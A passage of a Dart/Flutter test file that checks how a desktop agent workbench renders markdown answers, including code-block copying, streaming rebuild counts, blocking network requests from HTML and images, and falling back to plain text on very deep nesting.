// Markdown в ответе агента (итерация 2, задача 2.1 change
// `add-desktop-markdown`; spec agent-workbench-ui «Markdown в ответе агента»,
// «Блок кода в ответе агента», «Стриминг markdown без перестройки закрытых
// блоков»; design.md D1–D4, D7–D9, D13; invariant DSK-3, DSK-6).
//
// Имена тестов — ровно как в tasks.md и `12-3-desktop-display.md` §12.3.7:
// это критерии матрицы D-06.
//
// Сеть перехвачена `HttpOverrides` (R3): любой запрос из отрисовки — провал
// теста. Тесты идут без Material-предка: хостом служит `FluentApp`.

import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:ui' as ui;

import 'package:codelab_ui/codelab_ui.dart';
import 'package:codelab_ui/src/rendering/codelab_markdown_row.dart';
import 'package:codelab_ui/src/rendering/escape_for_display.dart';
import 'package:fluent_ui/fluent_ui.dart';
import 'package:flutter/foundation.dart'
    show SynchronousFuture, defaultTargetPlatform;
import 'package:flutter/gestures.dart';
import 'package:flutter/rendering.dart' show RenderParagraph;
import 'package:flutter/services.dart';
import 'package:flutter_test/flutter_test.dart';

/// Запросы, дошедшие до сети во время теста.
final List<String> _networkRequests = [];

/// Запрещает сеть: любое обращение к `HttpClient` пишется в
/// [_networkRequests] и падает (R3: пакет markdown сам умеет грузить
/// изображения, наша конфигурация не должна его вызывать).
class _ForbiddenNetwork extends HttpOverrides {
  @override
  HttpClient createHttpClient(SecurityContext? context) =>
      _ForbiddenHttpClient();
}

class _ForbiddenHttpClient extends Fake implements HttpClient {
  static const _requestMethods = {
    #open,
    #openUrl,
    #get,
    #getUrl,
    #post,
    #postUrl,
    #put,
    #putUrl,
    #delete,
    #deleteUrl,
    #head,
    #headUrl,
    #patch,
    #patchUrl,
  };

  @override
  dynamic noSuchMethod(Invocation invocation) {
    if (_requestMethods.contains(invocation.memberName)) {
      _networkRequests.add(
        '${invocation.memberName}: ${invocation.positionalArguments}',
      );
      throw StateError('Network is forbidden in markdown tests');
    }
    // Свойства клиента (`autoUncompress`, `userAgent`…) запросами не считаются.
    return null;
  }
}

/// Темы вынесены в `final` верхнего уровня: `FluentThemeData` сравнивается по
/// identity, и тема, созданная заново на каждом `pumpWidget`, выглядела бы для
/// ленты как смена темы (конфигурация markdown пересоздавалась бы).
final _lightTheme = FluentThemeData(brightness: Brightness.light);
final _darkTheme = FluentThemeData(brightness: Brightness.dark);

Widget _host(
  Widget child, {
  Brightness brightness = Brightness.light,
  double width = 600,
}) => FluentApp(
  debugShowCheckedModeBanner: false,
  themeMode: brightness == Brightness.dark ? ThemeMode.dark : ThemeMode.light,
  theme: _lightTheme,
  darkTheme: _darkTheme,
  home: ScaffoldPage(
    content: Align(
      alignment: Alignment.topLeft,
      child: SizedBox(
        width: width,
        child: SingleChildScrollView(child: child),
      ),
    ),
  ),
);

Widget _panelHost(
  List<CodeLabTranscriptRow> rows, {
  double height = 700,
  CodeLabViewMode viewMode = CodeLabViewMode.normal,
  Brightness brightness = Brightness.light,
}) => FluentApp(
  themeMode: brightness == Brightness.dark ? ThemeMode.dark : ThemeMode.light,
  theme: _lightTheme,
  darkTheme: _darkTheme,
  home: SizedBox(
    width: 700,
    height: height,
    child: CodeLabTranscriptPanel(rows: rows, viewMode: viewMode),
  ),
);

/// Первый `RichText`, в чьём тексте есть [needle].
RichText _richTextWith(WidgetTester tester, String needle) => tester
    .widgetList<RichText>(
      find.byWidgetPredicate(
        (w) => w is RichText && w.text.toPlainText().contains(needle),
      ),
    )
    .first;

/// Первое явно заданное значение в дереве спанов или значение корня.
T? _styleValue<T>(
  RichText text,
  T? Function(TextStyle style) pick, {
  String? onlyIn,
}) {
  T? found;
  text.text.visitChildren((span) {
    if (found != null) return false;
    if (span is TextSpan &&
        span.style != null &&
        (onlyIn == null || (span.text ?? '').contains(onlyIn))) {
      found = pick(span.style!);
    }
    return found == null;
  });
  if (found != null) return found;
  final root = text.text.style;
  return root == null ? null : pick(root);
}

double? _fontSizeOf(WidgetTester tester, String needle) =>
    _styleValue(_richTextWith(tester, needle), (s) => s.fontSize);

/// Документ для проверки стриминга: заголовки, абзацы и три закрытых блока
/// кода; в хвосте — абзац, чтобы все блоки до него были закрыты.
String _smallAnswer() {
  final b = StringBuffer('# Report\n\n');
  for (var i = 0; i < 3; i++) {
    b
      ..write('## Part $i\n\n')
      ..write('Paragraph $i with **bold** and `code`.\n\n')
      ..write('```dart\nfinal v$i = $i;\nprint(v$i);\n```\n\n');
  }
  b.write('The end of the answer.\n');
  return b.toString();
}

/// Ответ около [target] байт: заголовки, абзацы, списки, каждая пятая
/// секция — блок кода (прототип add-desktop-markdown, факт 1: на 48 КБ
/// первый блок кода монтировался дважды).
String _longAnswer(int target) {
  const para =
      'The agent inspected the repository and found that the **parser** '
      'keeps a *cache* of `Token` objects, see '
      '[the design note](https://example.com/design). ';
  final b = StringBuffer('# Report\n\n');
  var i = 0;
  while (b.length < target) {
    b
      ..write('## Section $i: findings\n\n')
      ..write('$para$para$para\n\n')
      ..write('- first item\n  - nested item\n- second item\n\n');
    if (i % 5 == 0) {
      b.write(
        '```dart\n// block-$i\nclass Parser$i {\n  int parse(String s) => 0;\n}\n```\n\n',
      );
    }
    i++;
  }
  b.write('Done.\n');
  return b.toString();
}

/// [n] растущих префиксов документа — как приходят дельты стрима.
List<String> _prefixes(String doc, int n) {
  // floor: префиксов должно быть не меньше n (ceil давал 149 вместо 200).
  final step = (doc.length / n).floor().clamp(1, doc.length);
  return [
    for (var end = step; end < doc.length + step; end += step)
      doc.substring(0, end.clamp(0, doc.length)),
  ];
}

/// Заголовки второго уровня документа — по ним проверяется «один раз».
Iterable<String> _headingsOf(String doc) => RegExp(
  r'^#{1,3} (.+)$',
  multiLine: true,
).allMatches(doc).map((m) => m.group(1)!);

/// Готовое изображение без обращения к сети и декодеру.
class _StaticImage extends ImageProvider<_StaticImage> {
  const _StaticImage(this.source);

  final ui.Image source;

  @override
  Future<_StaticImage> obtainKey(ImageConfiguration configuration) =>
      SynchronousFuture(this);

  @override
  ImageStreamCompleter loadImage(
    _StaticImage key,
    ImageDecoderCallback decode,
  ) => OneFrameImageStreamCompleter(
    SynchronousFuture(ImageInfo(image: source.clone())),
  );
}

/// Изображение, которое «загружается», пока тест не завершит [info].
class _PendingImage extends ImageProvider<_PendingImage> {
  const _PendingImage(this.info);

  final Future<ImageInfo> info;

  @override
  Future<_PendingImage> obtainKey(ImageConfiguration configuration) =>
      SynchronousFuture(this);

  @override
  ImageStreamCompleter loadImage(
    _PendingImage key,
    ImageDecoderCallback decode,
  ) => OneFrameImageStreamCompleter(info);
}

void main() {
  late HttpOverrides? previousOverrides;

  setUp(() {
    previousOverrides = HttpOverrides.current;
    _networkRequests.clear();
    HttpOverrides.global = _ForbiddenNetwork();
    CodeLabMarkdownStats.reset();
    CodeLabCodeHighlighter.shared.clear();
  });

  tearDown(() {
    HttpOverrides.global = previousOverrides;
    // Любой запрос в сеть — провал, даже если исключение проглотил пакет.
    expect(_networkRequests, isEmpty);
  });

  testWidgets('renders headings lists tables quotes and inline code', (
    tester,
  ) async {
    const answer = '''
# Heading one
## Heading two
### Heading three

Paragraph with **bold**, *italic*, ~~gone~~ and `inline code`.

- item one
  - nested one
    - nested deeper
- item two

1. first step
2. second step

- [ ] open task
- [x] done task

> quoted line

| Name | Value |
|---|---|
| alpha | 1 |
| beta | 2 |

---

tail paragraph
''';

    for (final brightness in Brightness.values) {
      await tester.pumpWidget(
        _host(
          const CodeLabMarkdown(id: 'agent-1', text: answer),
          brightness: brightness,
        ),
      );
      await tester.pump();

      // Список задач без Material-предка падает в самом пакете (issue #154,
      // D4): исключения быть не должно ни в одной теме.
      expect(tester.takeException(), isNull, reason: '$brightness');

      // Нет сырых маркеров разметки.
      for (final marker in ['**', '~~', '`', '# Heading', '- [']) {
        expect(
          find.textContaining(marker, findRichText: true),
          findsNothing,
          reason: '$marker in $brightness',
        );
      }

      // Заголовки трёх уровней имеют разные размеры.
      final sizes = {
        _fontSizeOf(tester, 'Heading one'),
        _fontSizeOf(tester, 'Heading two'),
        _fontSizeOf(tester, 'Heading three'),
      };
      expect(sizes, hasLength(3), reason: 'heading styles in $brightness');

      // Вложенный список, цитата, таблица и inline-код отрисованы.
      for (final text in [
        'nested deeper',
        'second step',
        'quoted line',
        'alpha',
        'beta',
        'inline code',
      ]) {
        expect(
          find.textContaining(text, findRichText: true),
          findsAtLeastNWidgets(1),
          reason: '$text in $brightness',
        );
      }
      expect(find.byType(Table), findsAtLeastNWidgets(1));

      // Список задач — Fluent `Checkbox` только для чтения (D4).
      final boxes = tester.widgetList<Checkbox>(find.byType(Checkbox)).toList();
      expect(boxes.map((b) => b.checked), [false, true]);
      expect(boxes.every((b) => b.onChanged == null), isTrue);
      await tester.tap(find.byType(Checkbox).first, warnIfMissed: false);
      await tester.pump();
      expect(
        tester
            .widgetList<Checkbox>(find.byType(Checkbox))
            .map((b) => b.checked),
        [false, true],
        reason: 'task checkbox must not react to taps',
      );

      // Цвет текста берётся из FluentTheme, а не из светлых умолчаний
      // пакета (прототип, факт 6; DSK-19).
      final theme = FluentTheme.of(
        tester.element(find.byType(CodeLabMarkdown)),
      );
      expect(
        _styleValue(_richTextWith(tester, 'Paragraph with'), (s) => s.color),
        theme.resources.textFillColorPrimary,
        reason: 'text color in $brightness',
      );
    }
  });

  testWidgets('code block shows language and copy puts raw code into '
      'clipboard', (tester) async {
    const code = 'final a = 1;\nfinal b = 2;';
    final clipboard = <String>[];
    tester.binding.defaultBinaryMessenger.setMockMethodCallHandler(
      SystemChannels.platform,
      (call) async {
        if (call.method == 'Clipboard.setData') {
          clipboard.add((call.arguments as Map)['text'] as String);
        }
        return null;
      },
    );
    addTearDown(
      () => tester.binding.defaultBinaryMessenger.setMockMethodCallHandler(
        SystemChannels.platform,
        null,
      ),
    );

    await tester.pumpWidget(
      _host(
        const CodeLabMarkdown(
          id: 'agent-1',
          text: 'Intro paragraph.\n\n```dart\n$code\n```\n\nOutro paragraph.',
        ),
      ),
    );
    await tester.pump();

    // Подпись языка видна, ограды нет.
    expect(find.text('dart'), findsOneWidget);
    expect(find.textContaining('```', findRichText: true), findsNothing);

    // Код — моноширинным шрифтом, переводы строк сохранены.
    final codeText = _richTextWith(tester, 'final a = 1;');
    expect(codeText.text.toPlainText(), code);
    final mono = CodeLabText.styleOf(
      tester.element(find.byType(CodeLabMarkdown)),
      CodeLabTextRole.mono,
    );
    expect(
      _styleValue(codeText, (s) => s.fontFamily),
      mono?.fontFamily,
      reason: 'code is monospace',
    );

    // «Copy» кладёт в буфер ровно две строки кода, без ограды и языка.
    final copy = find.byKey(const ValueKey('code-copy-agent-1-0'));
    expect(copy, findsOneWidget);
    await tester.tap(copy);
    // Таймер двойного клика `SelectableRegion` должен истечь до конца теста.
    await tester.pump(const Duration(seconds: 1));
    expect(clipboard, [code]);

    // Выделение всего ответа не содержит подписи `dart` (D4, факт 7).
    clipboard.clear();
    final region = tester.state<SelectableRegionState>(
      find.byType(SelectableRegion),
    );
    region.selectAll();
    await tester.pump();
    // Публичного способа получить выделенный текст без меню нет; метод
    // кладёт в буфер то же, что Cmd/Ctrl+C.
    // ignore: deprecated_member_use
    region.copySelection(SelectionChangedCause.toolbar);
    await tester.pump();
    expect(clipboard, isNotEmpty);
    final selected = clipboard.last;
    expect(selected, contains('final a = 1;'));
    expect(selected, contains('Intro paragraph.'));
    expect(selected, isNot(contains('dart')));
    expect(selected, isNot(contains('```')));
  });

  testWidgets('streaming 200 chunks builds each closed block once', (
    tester,
  ) async {
    final doc = _smallAnswer();
    final chunks = _prefixes(doc, 200);
    expect(chunks.length, greaterThanOrEqualTo(200));

    for (final text in chunks) {
      await tester.pumpWidget(
        _host(CodeLabMarkdown(id: 'agent-1', text: text, streaming: true)),
      );
    }
    expect(tester.takeException(), isNull);

    // Конец стрима: тот же текст с `streaming: false` не перестраивает
    // закрытые блоки и заголовки (D3, DSK-3).
    final builtBlocks = Map.of(CodeLabMarkdownStats.codeBlockBuilds);
    final builtHeadings = Map.of(CodeLabMarkdownStats.headingBuilds);
    await tester.pumpWidget(_host(CodeLabMarkdown(id: 'agent-1', text: doc)));
    await tester.pump();
    for (final entry in builtBlocks.entries) {
      expect(
        CodeLabMarkdownStats.codeBlockBuilds[entry.key],
        entry.value,
        reason: 'block ${entry.key} after stream end',
      );
    }
    for (final entry in builtHeadings.entries) {
      expect(
        CodeLabMarkdownStats.headingBuilds[entry.key],
        entry.value,
        reason: 'heading "${entry.key}" after stream end',
      );
    }

    // Три закрытых блока кода — по одному построению и монтажу (DSK-3, R1).
    for (var n = 0; n < 3; n++) {
      expect(
        CodeLabMarkdownStats.codeBlockBuilds['agent-1-$n'],
        1,
        reason: 'code block $n builds',
      );
      expect(
        CodeLabMarkdownStats.codeBlockMounts['agent-1-$n'],
        1,
        reason: 'code block $n mounts',
      );
    }
    // Заголовки, после которых документ продолжается, — по одному разу.
    for (final title in _headingsOf(doc)) {
      expect(
        CodeLabMarkdownStats.headingBuilds[title],
        1,
        reason: 'heading "$title" builds',
      );
    }
  });

  testWidgets('streaming 200 chunks builds each closed block once on a '
      '48 KB answer', (tester) async {
    final doc = _longAnswer(48 * 1024);
    final chunks = _prefixes(doc, 200);

    for (final text in chunks) {
      await tester.pumpWidget(
        _host(CodeLabMarkdown(id: 'agent-1', text: text, streaming: true)),
      );
    }
    expect(tester.takeException(), isNull);

    // Конец стрима: тот же текст с `streaming: false` не перестраивает
    // закрытые блоки и заголовки (D3, DSK-3).
    final builtBlocks = Map.of(CodeLabMarkdownStats.codeBlockBuilds);
    final builtHeadings = Map.of(CodeLabMarkdownStats.headingBuilds);
    await tester.pumpWidget(_host(CodeLabMarkdown(id: 'agent-1', text: doc)));
    await tester.pump();
    for (final entry in builtBlocks.entries) {
      expect(
        CodeLabMarkdownStats.codeBlockBuilds[entry.key],
        entry.value,
        reason: 'block ${entry.key} after stream end',
      );
    }
    for (final entry in builtHeadings.entries) {
      expect(
        CodeLabMarkdownStats.headingBuilds[entry.key],
        entry.value,
        reason: 'heading "${entry.key}" after stream end',
      );
    }

    // Прототип: первый блок кода монтировался дважды (R1). Если после
    // реализации тест красный из-за пакета — стоп и вопрос пользователю.
    expect(CodeLabMarkdownStats.codeBlockMounts['agent-1-0'], 1);
    expect(CodeLabMarkdownStats.codeBlockBuilds['agent-1-0'], 1);
    expect(CodeLabMarkdownStats.headingBuilds['Section 0: findings'], 1);
    expect(CodeLabMarkdownStats.headingBuilds['Section 1: findings'], 1);
  });

  testWidgets('rebuilding the transcript with the same theme does not '
      'rebuild closed blocks', (tester) async {
    final doc = _smallAnswer();
    await tester.pumpWidget(
      _panelHost([CodeLabAgentTextRow(id: 'agent-1', text: doc)]),
    );
    await tester.pump();
    final builds = Map.of(CodeLabMarkdownStats.codeBlockBuilds);
    final headings = Map.of(CodeLabMarkdownStats.headingBuilds);
    expect(builds.keys, containsAll(['agent-1-0', 'agent-1-1', 'agent-1-2']));

    // Новые экземпляры строк с тем же текстом и другая высота ленты: панель
    // перестраивается, тема Fluent та же (D3: конфигурация живёт в State
    // панели и не пересоздаётся).
    for (final height in [650.0, 640.0]) {
      await tester.pumpWidget(
        _panelHost([
          CodeLabAgentTextRow(id: 'agent-1', text: doc),
          const CodeLabUserRow(id: 'prompt-2', text: 'next'),
        ], height: height),
      );
      await tester.pump();
    }

    expect(CodeLabMarkdownStats.codeBlockBuilds, builds);
    expect(CodeLabMarkdownStats.headingBuilds, headings);
  });

  testWidgets('unclosed fence in tail renders plain and highlights after '
      'close', (tester) async {
    // Часть «без подсветки» (DSK-6); подсветку после закрытия и счётчики
    // `highlightRuns` целиком добавляет задача 3.1.
    await tester.pumpWidget(
      _host(
        const CodeLabMarkdown(
          id: 'agent-1',
          text: 'Before the block.\n\n```dart\nfinal a = 1;',
          streaming: true,
        ),
      ),
    );
    await tester.pump();

    expect(tester.takeException(), isNull);
    expect(find.textContaining('final a = 1;', findRichText: true), findsOne);
    expect(find.textContaining('```', findRichText: true), findsNothing);
    // Незакрытый блок — не «закрытое построение» и не запускает подсветку.
    expect(CodeLabMarkdownStats.codeBlockBuilds['agent-1-0'], isNull);
    expect(CodeLabMarkdownStats.highlightRuns, 0);
    final code = _richTextWith(tester, 'final a = 1;');
    final mono = CodeLabText.styleOf(
      tester.element(find.byType(CodeLabMarkdown)),
      CodeLabTextRole.mono,
    );
    expect(_styleValue(code, (s) => s.fontFamily), mono?.fontFamily);

    final paragraphElement = tester.element(
      find.byWidgetPredicate(
        (w) => w is RichText && w.text.toPlainText().contains('Before the'),
      ),
    );
    expect(CodeLabMarkdownStats.codeBlockMounts['agent-1-0'], 1);

    // Ограда закрылась: блок построен как закрытый один раз, ограды в
    // ленте по-прежнему нет.
    await tester.pumpWidget(
      _host(
        const CodeLabMarkdown(
          id: 'agent-1',
          text: 'Before the block.\n\n```dart\nfinal a = 1;\n```\n',
          streaming: true,
        ),
      ),
    );
    await tester.pump();
    expect(CodeLabMarkdownStats.codeBlockBuilds['agent-1-0'], 1);
    expect(find.textContaining('```', findRichText: true), findsNothing);
    // Блок не перемонтирован при закрытии, абзац перед ним — тот же Element
    // (DSK-3: закрытие ограды не перестраивает соседей).
    expect(CodeLabMarkdownStats.codeBlockMounts['agent-1-0'], 1);
    expect(
      tester.element(
        find.byWidgetPredicate(
          (w) => w is RichText && w.text.toPlainText().contains('Before the'),
        ),
      ),
      same(paragraphElement),
    );
  });

  testWidgets('html is shown as text and makes no network requests', (
    tester,
  ) async {
    await tester.pumpWidget(
      _host(
        const CodeLabMarkdown(
          id: 'agent-1',
          text:
              '<b>bold</b>\n\n'
              '<img src="https://x.example/y.png">\n\n'
              'after',
        ),
      ),
    );
    await tester.pump();

    expect(tester.takeException(), isNull);
    // Теги видны как написаны (D7), жирного начертания нет, изображения нет.
    expect(
      find.textContaining('<b>bold</b>', findRichText: true),
      findsOneWidget,
    );
    expect(
      find.textContaining(
        '<img src="https://x.example/y.png">',
        findRichText: true,
      ),
      findsOneWidget,
    );
    expect(find.byType(Image), findsNothing);
    // Сетевых запросов нет — это проверяет tearDown через HttpOverrides.
  });

  testWidgets('markdown images are placeholders and make no network '
      'requests', (tester) async {
    // `NetworkImage` берёт клиента через свой провайдер, мимо `HttpOverrides`.
    // Сбрасывается в конце теста: инварианты painting проверяются до tearDown.
    debugNetworkImageHttpClientProvider = _ForbiddenHttpClient.new;
    try {
      // VIEW-12, DSK-7, сценарий «нет запросов до клика»: без `imageBuilder`
      // пакет сам грузит PNG и SVG (D6, факт 3). Запросы ловит `tearDown`.
      await tester.pumpWidget(
        _host(
          const CodeLabMarkdown(
            id: 'agent-1',
            text:
                '![диаграмма](https://example.invalid/a.png)\n\n'
                '![](https://example.invalid/b.svg)',
          ),
        ),
      );
      await tester.pump();
      await tester.pump(const Duration(milliseconds: 100));

      expect(tester.takeException(), isNull);
      expect(find.byType(CodeLabImagePlaceholder), findsNWidgets(2));
      expect(
        find.textContaining('example.invalid · a.png', findRichText: true),
        findsOneWidget,
      );
      expect(
        find.textContaining('example.invalid · b.svg', findRichText: true),
        findsOneWidget,
      );
      expect(find.byType(Image), findsNothing);
      expect(
        find.byWidgetPredicate((w) => w.runtimeType.toString() == 'SvgPicture'),
        findsNothing,
      );
    } finally {
      debugNetworkImageHttpClientProvider = null;
    }
  });

  testWidgets('dollar is not a formula and backslash parentheses are', (
    tester,
  ) async {
    await tester.pumpWidget(
      _host(
        const CodeLabMarkdown(
          id: 'agent-1',
          text:
              r'стоит $5, а $HOME — переменная'
              '\n\n'
              r'формула \(a^2\) в строке',
        ),
      ),
    );
    await tester.pump();

    expect(tester.takeException(), isNull);
    // `$` остаётся обычным символом (D9).
    expect(
      find.textContaining(r'стоит $5, а $HOME', findRichText: true),
      findsOneWidget,
    );
    // `\(a^2\)` стала формулой: исходных разделителей в тексте нет.
    expect(find.textContaining(r'\(', findRichText: true), findsNothing);
    expect(find.textContaining('a^2', findRichText: true), findsNothing);
  });

  testWidgets('thoughts are shown without markdown and the answer is '
      'rendered', (tester) async {
    await tester.pumpWidget(
      _panelHost(
        const [
          CodeLabThoughtRow(id: 'thought-1', text: '**plan**: read files'),
          CodeLabAgentTextRow(id: 'agent-2', text: '**done**'),
        ],
        // verbose раскрывает мысли по умолчанию.
        viewMode: CodeLabViewMode.verbose,
      ),
    );
    await tester.pump();

    expect(tester.takeException(), isNull);
    // Мысли — как есть, со звёздочками.
    expect(
      find.textContaining('**plan**: read files', findRichText: true),
      findsOneWidget,
    );
    // Ответ — «done» жирным, без звёздочек.
    expect(find.textContaining('**done**', findRichText: true), findsNothing);
    final answer = _richTextWith(tester, 'done');
    final weight = _styleValue(answer, (s) => s.fontWeight);
    expect(weight, isNotNull);
    expect(weight!.value, greaterThanOrEqualTo(FontWeight.w600.value));
  });

  // ---- Ревью итерации 2: безопасность, меню, вложенность, ключи блоков ----

  const nestedNote = 'Shown as plain text: nesting is too deep.';

  Future<void> pumpMd(WidgetTester tester, String text) async {
    await tester.pumpWidget(_host(CodeLabMarkdown(id: 'agent-1', text: text)));
    await tester.pump();
  }

  String nestedList(int levels) =>
      [for (var i = 0; i < levels; i++) '${'  ' * i}- item$i'].join('\n');

  testWidgets('deeply nested quotes and lists fall back to plain text', (
    tester,
  ) async {
    // Решение пользователя 2026-11-11 (A): пакет на вложенности ~1000
    // уходит в Stack Overflow, а стоимость растёт квадратично (замер: 64 уровня
    // — 40 мс, 256 — 0,7 с). Кит считает глубину сам и при превышении порога
    // показывает моноширинный текст с пометкой.
    for (final text in ['${'> ' * 1000}x', nestedList(1000)]) {
      await pumpMd(tester, text);
      expect(tester.takeException(), isNull);
      expect(find.text(nestedNote), findsOneWidget);
      // Запасной вид — исходный текст в `CodeLabMonospaceBlock` как есть.
      final block = tester.widget<CodeLabMonospaceBlock>(
        find.byType(CodeLabMonospaceBlock),
      );
      expect(block.data, text);
    }
  });

  testWidgets('nesting at the threshold is markdown, one level more is plain', (
    tester,
  ) async {
    await pumpMd(tester, '${'> ' * kMaxMarkdownNestingDepth}x');
    expect(tester.takeException(), isNull);
    expect(find.text(nestedNote), findsNothing);
    expect(find.byType(CodeLabMonospaceBlock), findsNothing);

    await pumpMd(tester, '${'> ' * (kMaxMarkdownNestingDepth + 1)}x');
    expect(find.text(nestedNote), findsOneWidget);

    await pumpMd(tester, nestedList(kMaxMarkdownNestingDepth));
    expect(tester.takeException(), isNull);
    expect(find.text(nestedNote), findsNothing);

    await pumpMd(tester, nestedList(kMaxMarkdownNestingDepth + 1));
    expect(find.text(nestedNote), findsOneWidget);
  });

  testWidgets('quote markers inside a fenced block count as nesting too', (
    tester,
  ) async {
    // Решение оркестратора (ревью, второй круг): ограду пакет понимает иначе,
    // чем простой подсчёт (обратная кавычка в info-строке, конец контейнера),
    // поэтому глубину считаем и внутри оград — ошибка в сторону простого
    // текста безопасна, а 33 уровня `>` в настоящем коде не бывают.
    await pumpMd(tester, '```text\n${'> ' * 100}x\n```');
    expect(find.text(nestedNote), findsOneWidget);
  });

  testWidgets('nesting guard cannot be bypassed on one line or by fences', (
    tester,
  ) async {
    const n = 1000;
    final inputs = <String, String>{
      'bullets on one line': '${'- ' * n}x',
      'numbers on one line': '${'1. ' * n}x',
      'list and quote on one line': '${'- > ' * (n ~/ 2)}x',
      'backtick in info string': '```a`b\n\n${'> ' * n}',
      'fence inside a quote': '> ~~~\n\n${'> ' * n}',
    };
    for (final entry in inputs.entries) {
      await pumpMd(tester, entry.value);
      expect(tester.takeException(), isNull, reason: entry.key);
      expect(find.text(nestedNote), findsOneWidget, reason: entry.key);
    }
  });

  testWidgets('nesting guard counts line separators and prefixes the package '
      'tolerates', (tester) async {
    // Третий круг ревью безопасности: подсчёт намеренно завышен — считаются
    // все `>` и маркеры списка в строке, а строки делятся по любым
    // разделителям строк, поэтому BOM, `\f`, `\r`, U+2028 и сноска не прячут
    // вложенность (D14: ошибка в сторону простого текста безопасна).
    const n = 1000;
    final q = '${'> ' * n}x';
    final inputs = <String, String>{
      'CR separator': 'x\r$q',
      'CR separated indented list': [
        for (var i = 0; i < n; i++) '${'  ' * i}- x',
      ].join('\r'),
      'U+2028 separator': 'x $q',
      'BOM before quotes': '﻿$q',
      'one leading space': ' $q',
      'form feed before quotes': '\f$q',
      'footnote definition': '[^1]: $q\n\n[^1]',
    };
    for (final entry in inputs.entries) {
      await pumpMd(tester, entry.value);
      expect(tester.takeException(), isNull, reason: entry.key);
      expect(find.text(nestedNote), findsOneWidget, reason: entry.key);
    }
  });

  testWidgets('an ordinary technical answer stays markdown', (tester) async {
    // Запас порога: стрелки, лямбды, обобщённые типы и пункты в одной строке
    // — обычный технический текст, а не вложенность.
    const answer = '''
# Plan

The call chain is a -> b -> c -> d -> e -> f -> g -> h -> i -> j, and the
callback is `(x) => x * 2`. Use List<Map<String, List<int>>> for the cache.

- first item - with a dash - and more - dashes - here
- second item (see 1. above, then 2. below)

1. step one
2. step two

> quoted note

```dart
final f = (int a) => a > 1 ? a >> 2 : a << 1;
```
''';
    await pumpMd(tester, answer);
    expect(tester.takeException(), isNull);
    expect(find.text(nestedNote), findsNothing);
    expect(find.byType(CodeLabCodeBlock), findsOneWidget);
  });

  testWidgets('indentation after quote and list markers counts as nesting', (
    tester,
  ) async {
    // Четвёртый круг ревью безопасности: пакет вкладывает список в цитату
    // отступом ПОСЛЕ `>`, поэтому отступы считаются во всём ведущем префиксе
    // контейнеров, а не только в начале строки.
    const n = 600;
    final inputs = <String, String>{
      'tabs after quote': [
        for (var i = 0; i < n; i++) '>${'\t' * i}- x',
      ].join('\n'),
      'spaces after quote': [
        for (var i = 0; i < n; i++) '>${'  ' * i}- x',
      ].join('\n'),
      'spaces after list marker': [
        for (var i = 0; i < n; i++) '- ${'  ' * i}- x',
      ].join('\n'),
    };
    for (final entry in inputs.entries) {
      await pumpMd(tester, entry.value);
      expect(tester.takeException(), isNull, reason: entry.key);
      expect(find.text(nestedNote), findsOneWidget, reason: entry.key);
    }
  });

  testWidgets('an ordinary answer with CR and U+2028 line ends stays '
      'markdown', (tester) async {
    // Построчно глубина 3, в сумме по тексту — больше порога: без деления по
    // `\r` и U+2028 такой ответ ложно ушёл бы в простой текст.
    final lines = [for (var i = 0; i < 40; i++) '- a$i - b$i - c$i'];
    for (final separator in ['\r', ' ']) {
      await pumpMd(tester, lines.join(separator));
      expect(tester.takeException(), isNull);
      expect(
        find.text(nestedNote),
        findsNothing,
        reason: 'U+${separator.codeUnitAt(0).toRadixString(16)}',
      );
    }
  });

  testWidgets('one-line markers hit the same threshold as nested lines', (
    tester,
  ) async {
    final limit = kMaxMarkdownNestingDepth;
    final atLimit = <String, String>{
      'bullets': '${'- ' * limit}x',
      'numbers': '${'1. ' * limit}x',
      'list and quote': '${'- > ' * (limit ~/ 2)}x',
    };
    final over = <String, String>{
      'bullets': '${'- ' * (limit + 1)}x',
      'numbers': '${'1. ' * (limit + 1)}x',
      'list and quote': '${'- > ' * (limit ~/ 2 + 1)}x',
    };
    for (final entry in atLimit.entries) {
      await pumpMd(tester, entry.value);
      expect(tester.takeException(), isNull, reason: entry.key);
      expect(find.text(nestedNote), findsNothing, reason: entry.key);
    }
    for (final entry in over.entries) {
      await pumpMd(tester, entry.value);
      expect(find.text(nestedNote), findsOneWidget, reason: entry.key);
    }
  });

  testWidgets('deeply nested inline markup renders without errors', (
    tester,
  ) async {
    // Защита от смены версии пакета (R3, R7): вложенная inline-разметка пока
    // разбирается быстро (замер 2026-11-11: 10–50 мс), порог не нужен.
    final inputs = <String, String>{
      'emphasis': '${'*_' * 2000}x${'_*' * 2000}',
      'links': '${'[' * 3000}x${'](u)' * 3000}',
      'strike': '${'~~' * 3000}x${'~~' * 3000}',
    };
    for (final entry in inputs.entries) {
      final watch = Stopwatch()..start();
      await pumpMd(tester, entry.value);
      expect(tester.takeException(), isNull, reason: entry.key);
      expect(
        watch.elapsed,
        lessThan(const Duration(seconds: 5)),
        reason: entry.key,
      );
    }
  });

  group('selection context menu', () {
    testWidgets('right click offers Copy and Select all in Fluent', (
      tester,
    ) async {
      final clipboard = <String>[];
      tester.binding.defaultBinaryMessenger.setMockMethodCallHandler(
        SystemChannels.platform,
        (call) async {
          if (call.method == 'Clipboard.setData') {
            clipboard.add((call.arguments as Map)['text'] as String);
          }
          return null;
        },
      );
      addTearDown(
        () => tester.binding.defaultBinaryMessenger.setMockMethodCallHandler(
          SystemChannels.platform,
          null,
        ),
      );
      await pumpMd(
        tester,
        'Intro paragraph.\n\n```dart\nfinal a = 1;\n```\n\nOutro paragraph.',
      );

      final target = find.textContaining('Intro', findRichText: true);
      final gesture = await tester.startGesture(
        tester.getTopLeft(target) + const Offset(4, 6),
        kind: PointerDeviceKind.mouse,
        buttons: kSecondaryMouseButton,
      );
      await gesture.up();
      await tester.pump();

      expect(find.byType(FlyoutContent), findsOneWidget);
      expect(find.text('Copy'), findsWidgets);
      expect(find.text('Select all'), findsOneWidget);

      // «Select all» выделяет весь ответ; затем копия кладёт его в буфер без
      // подписи языка.
      await tester.tap(find.text('Select all'));
      await tester.pump();
      final gesture2 = await tester.startGesture(
        tester.getTopLeft(target) + const Offset(4, 6),
        kind: PointerDeviceKind.mouse,
        buttons: kSecondaryMouseButton,
      );
      await gesture2.up();
      await tester.pump();
      await tester.tap(
        find.descendant(
          of: find.byType(FlyoutContent),
          matching: find.text('Copy'),
        ),
      );
      await tester.pump(const Duration(seconds: 1));
      expect(clipboard, isNotEmpty);
      expect(clipboard.last, contains('Intro paragraph.'));
      expect(clipboard.last, contains('Outro paragraph.'));
      expect(clipboard.last, isNot(contains('dart')));
    }, variant: TargetPlatformVariant.only(TargetPlatform.macOS));
  });

  testWidgets('two identical code blocks get different copy keys and are '
